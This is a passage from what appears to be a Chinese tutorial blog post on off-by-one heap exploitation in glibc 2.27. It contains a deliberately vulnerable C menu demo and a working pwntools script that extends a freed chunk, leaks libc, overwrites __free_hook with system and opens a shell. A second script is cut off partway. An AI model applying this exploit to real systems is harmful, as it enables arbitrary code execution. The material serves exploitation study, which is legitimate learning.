class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;welcome&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; op;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;op);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(op == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) my_malloc();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(op == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) my_edit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(op == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) my_show();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(op == &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) my_free();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(op == &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	这个demo里的edit可以得到任意size,但假设只能溢出1字节&lt;/p&gt;
&lt;h1 id=&#34;利用1-扩展被释放块&#34;&gt;&lt;a href=&#34;#利用1-扩展被释放块&#34; class=&#34;headerlink&#34; title=&#34;利用1:扩展被释放块&#34;&gt;&lt;/a&gt;利用1:扩展被释放块&lt;/h1&gt;&lt;p&gt;​	利用思路可以总结为通过拓展一个被释放的块,覆盖掉后面的块,&lt;strong&gt;可以修改后面块的内容,比如fd,bk或者函数指针等,从而可以进一步利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gcc -g demo.c demo1&lt;/p&gt;
&lt;p&gt;patchelf –set-interpreter ~&amp;#x2F;pwn&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.27-3ubuntu1_amd64&amp;#x2F;ld-linux-x86-64.so.2 .&amp;#x2F;demo1&lt;/p&gt;
&lt;p&gt;patchelf –set-rpath &amp;#x2F;root&amp;#x2F;pwn&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.27-3ubuntu1_amd64&amp;#x2F; .&amp;#x2F;demo1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154728457.png&#34; alt=&#34;image-20230603154728457&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		覆盖前&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135909057.png&#34; alt=&#34;image-20230603135909057&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		覆盖后,可以修改后面的bin的内容了,然后再申请后面bin,就可以申请到free_hook等任意地址,进行修改&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135947149.png&#34; alt=&#34;image-20230603135947149&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	0x51的原因是  0x418 (0x410其实是) + 0x10的头 + 0x20的数据(或者说0x28) + 0x10的头&lt;/p&gt;
&lt;p&gt;​	所以就等于0x450, 不存在0x458这种,   其实这里改成多少都行,能覆盖到就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./demo1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5.exit&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;alloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p8(&lt;span class=&#34;number&#34;&gt;0x51&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x448&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xa0&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 0x440 0x448都可以,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_libc = u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = leak_libc - &lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# main+96和libc起始位置偏移&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(leak_libc))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x448&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;)+p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;​	奇怪的是,这里的free(2)为什么没有被合并呢, 一般需要加一个堆块挡着&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;h1 id=&#34;利用2-扩展已分配块&#34;&gt;&lt;a href=&#34;#利用2-扩展已分配块&#34; class=&#34;headerlink&#34; title=&#34;利用2: 扩展已分配块&#34;&gt;&lt;/a&gt;利用2: 扩展已分配块&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154943782.png&#34; alt=&#34;image-20230603154943782&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		感觉和1差不多其实,就是换一下顺序&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./demo1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 